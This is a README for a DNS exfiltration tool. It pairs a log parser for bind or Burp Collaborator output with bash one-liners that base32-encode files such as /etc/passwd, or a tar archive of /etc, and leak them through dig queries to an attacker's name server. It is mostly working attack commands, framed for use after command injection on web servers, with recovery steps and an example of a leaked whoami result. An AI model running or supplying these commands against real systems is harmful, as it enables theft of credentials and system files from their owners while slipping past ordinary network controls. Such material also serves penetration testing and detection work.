# DNS-Exfiltrate

Parses bind query logs or private Burp Collaborator output to exfiltrate data. Note that you will get more reliable results by specifying the name server via `dig @`...

Burp Collaborator allows appending hostnames to the provided address. For example: assume this is your collaborator address: `h6olm71com6vuvx1bsaqddjik9q4et.oastify.com`

You may prepend a 'hostname' (maximum length of a DNS label is 63 bytes), assuming it uses characters safe in a DNS query (such as base32-encoded data, see below). This allows exfiltration (including blind exfiltration) of data via DNS.

Here is the base32-encoded output from `whoami` exfiltrated via Burp Collaborator:

`O53XOLLEMF2GCCQ.h6olm71com6vuvx1bsaqddjik9q4et.oastify.com`

`dns-parse.py` parses native bind query logs, or private Burp Collaborator output, which may be logged via `tee`:

```
java -jar /root/collaborator/burpsuite_pro.jar --collaborator-server | tee /root/collaborator/collaborator.log
```

Assumes hostnames are encoded in `base32` (`A-Z`, `2-7`), which most efficent native (on most Linux/Unix systems) utility that is safe for DNS queries. The `=` character is not DNS safe, but can be trimmed using `tr -d =` on Linux/Unix systems. `dns-parse.py` adds any missing `=` characters back.

Hex encoding is also safe for DNS queries (but is less efficient). I may add hex support in the future. `base64` does not work due to `/` and `+`.

Thanks to Xavier Mertens for this excellent Internet Storm Center post: https://isc.sans.edu/diary/DNS+Query+Length...+Because+Size+Does+Matter/22326

Use cases (bash):

## Exfiltrate a file:

```
cat /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

To recover the file (on a bind DNS server):

```
./dns-parse.py <DNS Name> query.log bind | base32 -d
```

To recover the file (on a private Burp Collaborator server):

```
./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d
```

## Exfiltrate a compressed file:

```
cat /etc/passwd | gzip - | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

To recover/unzip the file (on a bind DNS server):

```
./dns-parse.py <DNS Name> query.log bind | base32 -d | zcat
```

To recover/unzip the file (on a private Burp Collaborator server):

```
./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d | zcat 
```

## Exfiltrate a compressed tar archive of a directory:

Note that exfiltrating /etc on an Ubuntu Linux system worked perfecttly (but took a while). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.

```
tar czf - /etc | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

To recover the tar file (on a bind DNS server):

```
./dns-parse.py <DNS Name> query.log bind | base32 -d > exfiltrated.tgz
```

To recover the tar file (on a bind DNS server):

```
./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d > exfiltrated.tgz
```
